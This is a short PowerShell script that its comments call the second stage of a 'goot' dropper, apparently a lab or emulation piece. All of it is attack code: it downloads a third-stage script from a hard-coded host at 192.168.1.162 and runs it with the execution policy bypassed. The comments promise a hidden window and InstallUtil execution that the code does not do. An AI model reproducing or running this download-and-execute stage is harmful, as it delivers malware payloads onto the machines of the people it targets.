# This will be the second stage of the goot dropper
# It will download and execute the final payload
# The final payload will be a .NET assembly
# The final payload will be executed using the "InstallUtil" utility

# The final payload will be downloaded from the following URL

# Execute a powershell command in a hidden window
# Download the final payload
$url = 'http://192.168.1.162:8000/goot_stage3.ps1'
$outputFile = Join-Path (Get-Location) 'goot_stage3.ps1'
Invoke-WebRequest -Uri $url -OutFile $outputFile

# Execute the final payload
Start-Process -FilePath 'powershell.exe' -ArgumentList '-ExecutionPolicy Bypass -File ""$outputFile""' -WindowStyle Normal



